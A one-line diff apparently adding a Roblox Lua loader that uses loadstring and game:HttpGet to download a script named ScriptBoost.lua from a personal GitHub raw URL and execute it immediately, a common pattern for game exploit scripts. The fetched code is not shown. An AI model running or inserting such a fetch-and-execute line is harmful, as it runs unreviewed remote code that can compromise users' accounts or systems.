@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/TikTokGG67439/ScriptBoost.lua/refs/heads/main/ScriptBoost.lua", true))()
